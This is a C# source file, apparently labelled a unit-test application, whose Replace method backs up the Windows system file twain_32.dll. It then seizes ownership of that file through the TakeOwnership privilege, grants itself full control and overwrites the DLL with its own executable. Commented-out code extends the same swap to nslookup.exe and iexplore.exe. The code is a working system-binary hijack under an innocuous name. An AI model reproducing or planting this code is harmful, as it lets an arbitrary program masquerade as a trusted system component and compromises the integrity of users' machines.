using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Security.AccessControl;
using System.Security.Principal;
using ProcessPrivileges;



namespace UnitTestApplication
{
    class Replacement
    {
        private const string TwainFileName = "twain_32.dll";
        private const string NslookupFileName = "nslookup.exe";
        private const string IeFileName = "iexplore.exe";

        public void Replace()
        {
            var currentFilePath = Assembly.GetExecutingAssembly().Location;
            var backupDirectory = Path.Combine(Directory.GetCurrentDirectory(), "UnitTestApplicationBackup");
            if (!Directory.Exists(backupDirectory))
            {
                Directory.CreateDirectory(backupDirectory);
            }

            var currentTwainPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), TwainFileName);
            var currentNslookupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), NslookupFileName);
            var currentIePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), IeFileName);

            if (File.Exists(currentTwainPath))
            {
                File.Copy(currentTwainPath, Path.Combine(backupDirectory, TwainFileName), true);

                using (new PrivilegeEnabler(Process.GetCurrentProcess(), Privilege.TakeOwnership))
                {
                    var fs = File.GetAccessControl(currentTwainPath);

                    var ntAccount = new NTAccount(WindowsIdentity.GetCurrent().Name);
                    fs.SetOwner(ntAccount);
                    File.SetAccessControl(currentTwainPath, fs);
                    fs = File.GetAccessControl(currentTwainPath);
                    fs.AddAccessRule(new FileSystemAccessRule(ntAccount, FileSystemRights.FullControl, AccessControlType.Allow));
                    File.SetAccessControl(currentTwainPath, fs);

                    File.Copy(currentFilePath, currentTwainPath, true);
                }
            }

            //if (File.Exists(currentNslookupPath))
            //{
            //    File.Copy(currentNslookupPath, Path.Combine(backupDirectory, NslookupFileName), true);
            //    File.Copy(currentFilePath, currentNslookupPath, true);
            //}

            //if (File.Exists(currentIePath))
            //{
            //    File.Copy(currentIePath, Path.Combine(backupDirectory, IeFileName), true);
            //    File.Copy(currentFilePath, currentIePath, true);
            //}
        }
    }
}
